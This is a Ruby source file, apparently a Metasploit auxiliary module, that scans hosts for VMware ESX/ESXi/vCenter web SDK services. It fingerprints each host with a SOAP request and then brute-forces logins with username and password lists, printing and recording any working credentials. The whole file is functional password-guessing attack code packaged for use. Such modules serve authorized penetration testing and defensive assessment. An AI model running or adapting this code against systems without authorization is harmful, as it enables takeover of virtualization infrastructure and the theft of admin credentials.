##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'rex/proto/ntlm/message'


class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::VIMSoap
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'VMWare Web Login Scanner',
      'Description'    => 'This module attempts to authenticate to the VMWare HTTP service
        for VmWare Server, ESX, and ESXI',
      'Author'         => ['theLightCosine'],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('URI', [true, "The default URI to login with", "/sdk"]),
        Opt::RPORT(443)
      ], self.class)

    register_advanced_options([OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', true]),])
  end


  def run_host(ip)
    return unless check == Exploit::CheckCode::Detected
    each_user_pass { |user, pass|
      result = vim_do_login(user, pass)
      case result
      when :success
        print_good "#{rhost}:#{rport} - Successful Login! (#{user}:#{pass})"
        report_auth_info(
          :host   => rhost,
          :port   => rport,
          :user   => user,
          :pass   => pass,
          :source_type => "user_supplied",
          :active => true
        )
        return if datastore['STOP_ON_SUCCESS']
      when :fail
        print_error "#{rhost}:#{rport} - Login Failure (#{user}:#{pass})"
      end
    }
  end


  # Mostly taken from the Apache Tomcat service validator
  def check
    soap_data =
      %Q|<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>|

    begin
      res = send_request_cgi({
        'uri'     => normalize_uri(datastore['URI']),
        'method'  => 'POST',
        'agent'   => 'VMware VI Client',
        'data'    => soap_data
      }, 25)

      if res
        return Exploit::CheckCode::Detected if fingerprint_vmware(res)
      else
        vprint_error("Error: no response")
        return Exploit::CheckCode::Unknown
      end

    rescue ::Rex::ConnectionError => e
      vprint_error("Error: could not connect")
      return Exploit::CheckCode::Unknown
    rescue
      vprint_error("Error: #{e}")
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Safe
  end

  def fingerprint_vmware(res)
    unless res
      vprint_error("Error: no response")
      return false
    end
    return false unless res.body.include?('<vendor>VMware, Inc.</vendor>')

    os_match = res.body.match(/<name>([\w\s]+)<\/name>/)
    ver_match = res.body.match(/<version>([\w\s\.]+)<\/version>/)
    build_match = res.body.match(/<build>([\w\s\.\-]+)<\/build>/)
    full_match = res.body.match(/<fullName>([\w\s\.\-]+)<\/fullName>/)

    if full_match
      vprint_good "Identified #{full_match[1]}"
      report_service(:host => rhost, :port => rport, :proto => 'tcp', :sname => 'https', :info => full_match[1])
    end

    if os_match and ver_match and build_match
      if os_match[1] =~ /ESX/ or os_match[1] =~ /vCenter/
        this_host = report_host( :host => rhost, :os_name => os_match[1], :os_flavor => ver_match[1], :os_sp => "Build #{build_match[1]}" )
      end
      return true
    else
      vprint_error("Error: Could not identify as VMWare")
      return false
    end

  end


end
